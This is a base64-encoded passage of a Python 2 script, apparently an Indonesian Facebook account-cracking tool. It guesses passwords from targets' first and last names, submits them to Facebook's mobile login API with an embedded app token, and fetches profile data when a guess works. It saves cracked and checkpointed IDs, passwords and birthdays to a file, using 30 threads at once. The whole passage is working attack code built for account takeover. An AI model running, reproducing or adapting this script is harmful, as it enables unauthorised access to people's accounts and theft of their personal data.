QkJCQkJCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHdbJ2Vycm9yX21zZyddOgoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkzbSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzMTAgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSgiXG5JRDoiICt1c2VyKyAiIFB3OiIgK3Bhc3MxMCsgIiBUVEw6IiArY1snYmlydGhkYXknXSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczEwKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXBhc3MxMSA9IGNbJ2ZpcnN0X25hbWUnXQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMTEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHc6CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49Iit3WydhY2Nlc3NfdG9rZW4nXSkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTJtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3MxMSArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMTEpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJcHJpbnQgJ1wwMzNbMTs5M20gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczExICsgJ3wnICsgY1snYmlydGhkYXknXQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKCJcbklEOiIgK3VzZXIrICIgUHc6IiArcGFzczExKyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczExKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwYXNzMTIgPSBjWydsYXN0X25hbWUnXQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MxMikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJdyA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHc6CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3dbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTJtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3MxMiArICd8JyArIGNbJ2JpcnRoZGF5J10KCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MxMikKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106CgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXDAzM1sxOzkzbSAtLT4gJyArIHVzZXIgKyAnfCcgKyBwYXNzMTIgKyAnfCcgKyBjWydiaXJ0aGRheSddCgkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKCJcbklEOiIgK3VzZXIrICIgUHc6IiArcGFzczEyKyAiIFRUTDoiICtjWydiaXJ0aGRheSddKQoJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxMikKCQlleGNlcHQ6CgkJCXBhc3MKCQkJCglwID0gVGhyZWFkUG9vbCgzMCkKCXAubWFwKG1haW4sIGlkKQoJcHJpbnQgIlwwMzNbMTs5N20gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIgoJcHJpbnQgJ1wwMzNbMTs5N20gU2VsZXNhaSAuLi4uJwoJcHJpbnQiXDAzM1sxOzk3bSBUb3RhbCBcMDMzWzE7OTJtT0tcMDMzWzE7OTdtL1x4MWJbMTs5M21DUCBcMDMzWzE7OTdtOiBcMDMzWzE7OTJtIitzdHIobGVuKG9rcykpKyJcMDMzWzE7OTdtL1wwMzNbMTs5M20iK3N0cihsZW4oY2VrcG9pbnQpKQoJcHJpbnQgJ1wwMzNbMTs5N20gRmlsZSBDUCBUZXJzaW1wYW4gOiBvdXQvc3VwZXJfY3AudHh0JwoJcHJpbnQgIlwwMzNbMTs5N20gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIgoJcmF3X2lucHV0KCJcMDMzWzE7OTdtIFsgS2VtYmFsaSBdICIpCglvcy5zeXN0ZW0oInB5dGhvbjIgcnluLnB5IikKCiMjIyMjIFVTRVJOQU1FIElEICMjIyMKZGVmIGlkX2dlbigpOgoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglwcmludCA1MCogIlwwMzNbMTs5N23ilIAiCglsaW5nID0gKCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vJykKCXVybCA9IGxpbmcrcmF3X2lucHV0KCJcMDMzWzE7OTdtIC0+IFVzZXJuYW1lIDogIikKCWlkcmUgPSByZS5jb21waWxlKCciZW50aXR5X2lkIjoiKFswLTldKykiJykKCXBhZ2UgPSByZXF1ZXN0cy5nZXQodXJsKQoJcHJpbnQgaWRyZS5maW5kYWxsKHBhZ2UuY29udGVudCkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTdtIEVudGVyIFVudHVrIEtlbWJhbGkgOikiKQoJbWVudSgpCgppZiBfX25hbWVfXz09J19fbWFpbl9fJzoKICAgIG1lbnUoKQogICAgbWFzdWsoKQo=
